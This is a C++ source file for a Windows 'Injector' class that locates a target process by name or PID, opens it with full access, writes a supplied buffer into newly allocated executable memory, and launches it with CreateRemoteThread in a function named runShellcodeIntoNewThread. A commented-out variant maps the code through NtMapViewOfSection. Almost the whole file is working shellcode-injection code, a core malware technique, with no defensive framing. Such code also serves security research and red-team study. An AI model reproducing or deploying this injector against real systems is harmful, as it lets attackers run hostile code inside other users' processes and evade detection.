#include "Injector.h"
#include <psapi.h>
#include <wchar.h>
#include "stdio.h"
#include "ntddk.h"
#include "pe_hdrs_helper.h"


using namespace std;

#define MAX_PROCESSES_ARRAY_SIZE 2048
#define PAGE_SIZE 0x1000


bool isSearchedProcess(DWORD processID, LPWSTR searchedName);
bool getProcessName(HANDLE hProcess, LPWSTR nameBuf, SIZE_T nameMax);

typedef enum {
	usingRandomMethod,
	usingCreateRemoteThread,
	usingZwCreateThreadEx,
	usingRtlCreateUserThread,
	CREATION_METHODS_SIZE
} THREAD_CREATION_METHOD;

Injector::Injector()
{
	injectedProcessHandle = NULL;
}
Injector::~Injector()
{

}

HANDLE Injector::loadProcessByName(LPWSTR processName)
{
	DWORD processes[MAX_PROCESSES_ARRAY_SIZE];
	DWORD cbNeeded, cProcesses;
	if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
		return NULL;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (int i = 0; i < cProcesses; i++) {
		if (processes[i] != 0) {
			if (isSearchedProcess(processes[i], processName)) {
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processes[i]);
				injectedProcessHandle = hProcess;
				wcscpy_s(injectedProcessName, processName);
				//injectedProcessName = processName;
				return hProcess;
			}
		}
	}
	return NULL;
}
HANDLE Injector::loadProcessByPID(DWORD processID)
{
	DWORD processes[MAX_PROCESSES_ARRAY_SIZE];
	DWORD cbNeeded, cProcesses;
	if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
		return NULL;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (int i = 0; i < cProcesses; i++) {
		if (processes[i] != 0) {
			if(processID == processes[i])
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processes[i]);
				WCHAR szProcessName[MAX_PATH];
				if (getProcessName(hProcess, szProcessName, MAX_PATH)) {
					injectedProcessHandle = hProcess;
					wcscpy_s(injectedProcessName, szProcessName);
					//injectedProcessName = szProcessName;
					printf("process opened! \nprocess name: %S \nPID: %d \nprocess handle: %d \n", injectedProcessName, processID, injectedProcessHandle);
					return hProcess;
				}
			}
		}
	}
	return NULL;
}

bool Injector::getProcessList(vector<ProcessStruct>* processList)
{
	DWORD processes[MAX_PROCESSES_ARRAY_SIZE];
	DWORD cbNeeded, cProcesses;
	if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
		return false;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (int i = 0; i < cProcesses; i++) {
		if (processes[i] != 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processes[i]);

			if (hProcess != NULL)
			{
				WCHAR szProcessName[MAX_PATH];
				if (getProcessName(hProcess, szProcessName, MAX_PATH)) {
					struct ProcessStruct proc;
					wcscpy_s(proc.processName, szProcessName);
					proc.processPID = processes[i];
					processList->push_back(proc);
				}

			}
			CloseHandle(hProcess);
		}
	}
	return true;
}

/*
PVOID map_buffer_into_process1(HANDLE hProcess, LPBYTE buffer, SIZE_T buffer_size, DWORD protect = PAGE_EXECUTE_READWRITE)
{
	HANDLE hSection = NULL;
	OBJECT_ATTRIBUTES hAttributes;
	memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

	LARGE_INTEGER maxSize;
	maxSize.HighPart = 0;
	maxSize.LowPart = static_cast<DWORD>(buffer_size);
	NTSTATUS status = NULL;
	if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, protect, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
		printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
		return NULL;
	}
	printf("Section handle: %p\n", hSection);

	PVOID sectionBaseAddress = NULL;
	ULONG viewSize = 0;
	SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE

	// map the section in context of current process:
	if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, protect)) != STATUS_SUCCESS)
	{
		printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
		return NULL;
	}
	printf("Section BaseAddress: %p\n", sectionBaseAddress);

	memcpy(sectionBaseAddress, buffer, buffer_size);
	printf("Buffer copied!\n");

	//map the new section into context of opened process
	PVOID sectionBaseAddress2 = NULL;
	if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, protect)) != STATUS_SUCCESS)
	{
		printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
	}

	//unmap from the context of current process
	ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
	ZwClose(hSection);

	printf("Section mapped at address: %p\n", sectionBaseAddress2);
	// return remote address of the new section, or NULL if failed to map
	return sectionBaseAddress2;
}
*/
LPVOID Injector::mapBufferIntoProcess(HANDLE hProcess, LPBYTE buffer, SIZE_T buffer_size, DWORD protect)
{
	LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, protect);
	if (remoteAddress == NULL) {
		printf("Could not allocate memory in the remote process\n");
		return NULL;
	}


	if (!WriteProcessMemory(hProcess, remoteAddress, buffer, buffer_size, NULL)) {
		VirtualFreeEx(hProcess, remoteAddress, buffer_size, MEM_FREE);
		return NULL;
	}
	return remoteAddress;
}

bool Injector::runShellcodeIntoNewThread(HANDLE hProcess, LPVOID remote_shellcode_ptr)
{

	printf("Shellcode run");
	NTSTATUS status = NULL;
	//create a new thread for the injected code:
	LPTHREAD_START_ROUTINE routine = (LPTHREAD_START_ROUTINE)remote_shellcode_ptr;

	DWORD threadId = NULL;
	HANDLE hMyThread = NULL;
	if ((hMyThread = CreateRemoteThread(hProcess, NULL, NULL, routine, NULL, CREATE_SUSPENDED, &threadId)) == NULL) {
		printf("[ERROR] CreateRemoteThread failed, status : %x\n", GetLastError());
		return false;
	}
	printf("Created Thread, id = %x\n", threadId);
	printf("Resuming added thread...\n");
	ResumeThread(hMyThread); //injected code
	return true;
}


bool isSearchedProcess(DWORD processID, LPWSTR searchedName)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (hProcess == NULL) return false;

	WCHAR szProcessName[MAX_PATH];
	if (getProcessName(hProcess, szProcessName, MAX_PATH)) {
		if (wcsstr(szProcessName, searchedName) != NULL) {
			printf("%S  (PID: %u)\n", szProcessName, processID);
			CloseHandle(hProcess);
			return true;
		}
	}
	CloseHandle(hProcess);
	return false;
}

bool getProcessName(HANDLE hProcess, LPWSTR nameBuf, SIZE_T nameMax)
{
	HMODULE hMod;
	DWORD cbNeeded;

	if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
		GetModuleBaseName(hProcess, hMod, nameBuf, nameMax);
		return true;
	}
	return false;
}

HANDLE Injector::getInjectedProcessHandle()
{
	return this->injectedProcessHandle;
}

LPWSTR Injector::getInjectedProcessName()
{
	return this->injectedProcessName;
}
